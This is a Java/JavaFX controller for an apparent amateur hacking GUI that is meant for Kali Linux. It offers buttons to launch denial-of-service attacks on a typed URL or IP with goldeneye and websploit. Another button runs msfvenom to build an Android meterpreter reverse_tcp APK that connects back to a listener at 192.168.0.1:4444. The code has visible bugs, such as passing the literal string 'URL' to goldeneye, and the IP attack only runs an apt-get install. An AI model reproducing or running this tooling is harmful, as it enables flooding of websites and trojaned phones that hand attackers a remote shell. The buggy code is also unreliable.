package gui;

import commands.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ResourceBundle;

import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.text.Text;


public class mainController implements javafx.fxml.Initializable, EventHandler<ActionEvent>{
	
	@FXML
	private TextArea resultMessages;
	@FXML
	private Text waterMark;
	
	// DOS
	@FXML
	private TextField typeDOSURL;
	@FXML
	private Button startDOS;
	@FXML
	private Button stopDOS;
	//  - radio buttons
	private final ToggleGroup dosGroup = new ToggleGroup();
	@FXML
	private RadioButton ipDOS;
	@FXML
	private RadioButton urlDOS;
	
	// hack android devices
	@FXML
	private TextField typeAPK;
	@FXML
	private Button helpAPK;
	@FXML
	private Button createAPK;
	
	
	public void initialize(URL location, ResourceBundle resources) {
		
		//DOSING
		stopDOS.setVisible(false); // we cannot see this button till we click startDOS
		startDOS.setOnAction(this);
		stopDOS.setOnAction(this);
		urlDOS.setToggleGroup(dosGroup);
		urlDOS.setSelected(true);
		ipDOS.setToggleGroup(dosGroup);
		
		//HACKING ANDROID
		createAPK.setOnAction(this);
		
	} //end initialize

	public void handle(ActionEvent E) {
		if(E.getSource() == startDOS && ipDOS.isSelected()) // if user clicks the DOS start button and is an IP dos
		{
			String IP = typeDOSURL.getText();
			if(IP.contains("."))
			{
			attackIPDOS(IP);
			} else {
				resultMessages.setText("Error - Invalid IP! Please recheck the IP Address. \n"
						+ "Example:   172.155.135.62");
			}
		}
		
		if(E.getSource() == startDOS && urlDOS.isSelected()) // if user clicks the DOS start button and is a URL dos
		{
			String URL = typeDOSURL.getText();
			if( (URL.contains("http://") || URL.contains("https://")) && (URL.lastIndexOf("/") == URL.length() -1) )
			{ // the url must have http:// or https:// and a slash in the end
	        attackURLDOS(URL);
			} else {
			resultMessages.setText("Error - Invalid URL! Please add a http:// or https:// and a slash in the end of the URL. \n"
					+ "Example:   http://www.google.com/");
			}
		}
		
		if(E.getSource() == stopDOS) // if user clicks the DOS stop button
		{
			typeDOSURL.setText("");
			resultMessages.setText("No longer DOSing the website.");
			typeDOSURL.setDisable(false);
			stopDOS.setVisible(false);
			startDOS.setDisable(false);
		}
		if(E.getSource() == createAPK)
		{
			String apkName = typeAPK.getText();
			if(!apkName.isEmpty())
			{ // we will not allow empty names
			createAndroidAPK(apkName);
			} else {
				resultMessages.setText("Please do not make an empty APK name.");
			}
		}
	} //end handle

	private void attackURLDOS(String URL) {
	        String DOSCommand = "goldeneye " + "URL";
	        boolean Success = false;
	        try {
	        Process processCommand = Runtime.getRuntime().exec(DOSCommand);
	        
	        // get success output
	        BufferedReader stdInput = new BufferedReader(new 
	                InputStreamReader(processCommand.getInputStream()));

	        // get error output
	           BufferedReader stdError = new BufferedReader(new 
	                InputStreamReader(processCommand.getErrorStream()));
	           
	           /* debug
	           String line = null;   
	           while ((line = stdInput.readLine()) != null) {
	              resultMessages.appendText(line);
	           }
	           while ((line = stdError.readLine()) != null) {
	               resultMessages.appendText(line);
	            }
	            */
	           
	           if(stdInput.readLine() == null && stdError.readLine() != null)
	           { // if we had an error
	        	   resultMessages.setText("Error - Could not perform the goldeneye DOS command... \n"
	        	   		+ "Perhaps you are not using Kali Linux, used an invalid URL, or don't have goldeneye installed?");
	        	   Success = false;
	           } else {
	        	   resultMessages.setText("Now DOSing:  " + URL);
	        	   Success = true;
	           }
	           
	           
	        } catch (IOException e) {
	        e.printStackTrace(); // our OS is not linux
	        resultMessages.setText("Error - Not connected to the Kali Linux Terminal...");
	        }
	        
	        if(Success == true) { // success! we did the command
	        	typeDOSURL.setDisable(true); // we don't want anyone changing the URL
	        	startDOS.setDisable(true); // we don't want anyone clicking the button
	        	stopDOS.setVisible(true);
	        }
	        
	} //end attackDOS	
	private void attackIPDOS(String IP){
        String DOSCommand = "apt-get install websploit";
        boolean Success = false;
        try {
        Process processCommand = Runtime.getRuntime().exec(DOSCommand);
        
        // output success
        BufferedReader stdInput = new BufferedReader(new 
                InputStreamReader(processCommand.getInputStream()));

        // output errors
           BufferedReader stdError = new BufferedReader(new 
                InputStreamReader(processCommand.getErrorStream()));

           if(stdInput.readLine() == null && stdError.readLine() != null)
           {
        	   resultMessages.setText("Error - Could not perform the websploit DOS command... \n"
        	   		+ "Perhaps you are not using Kali Linux, used an invalid URL, or don't have websploit installed?");
        	   Success = false;
           } else {
        	   resultMessages.setText("Now DOSing:  " + IP);
        	   Success = true;
           }
           
        } catch (IOException e) {
        e.printStackTrace(); // we're not even in a linux OS
        resultMessages.setText("Error - Not connected to the Kali Linux Terminal...");
        }
        
        if(Success == true) { // success! we did the command
        	typeDOSURL.setDisable(true); // we don't want anyone changing the URL
        	startDOS.setDisable(true); // we don't want anyone clicking the button
        	stopDOS.setVisible(true);
        }
	}
	private void createAndroidAPK(String apkName)
	{
        String apkCommand = "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 R > /root/Desktop/" + apkName + ".apk";
        boolean Success = false;
        try {
        Process processCommand = Runtime.getRuntime().exec(apkCommand);
        
        // output success
        BufferedReader stdInput = new BufferedReader(new 
                InputStreamReader(processCommand.getInputStream()));

        // output errors
           BufferedReader stdError = new BufferedReader(new 
                InputStreamReader(processCommand.getErrorStream()));
           
           /* debug
           String line = null;   
           while ((line = stdInput.readLine()) != null) {
              resultMessages.appendText(line);
           }
           while ((line = stdError.readLine()) != null) {
               resultMessages.appendText(line);
            }
            */

           
           if(stdInput.readLine() == null && stdError.readLine() != null)
           {
        	   resultMessages.setText("Error - Could not perform the command... \n"
        	   		+ "Perhaps you are not using Kali Linux?");
        	   Success = false;
           } else {
        	   resultMessages.setText("APK has been successfully created and placed in the user's Desktop.");
        	   Success = true;
           }
           
           
        } catch (IOException e) {
        e.printStackTrace(); // we're not even in a linux OS
        resultMessages.setText("Error - Not connected to the Kali Linux Terminal...");
        }
        
        if(Success == true) { // success! we did the command
        	typeAPK.setText("");
        }
	}
	
} //end class
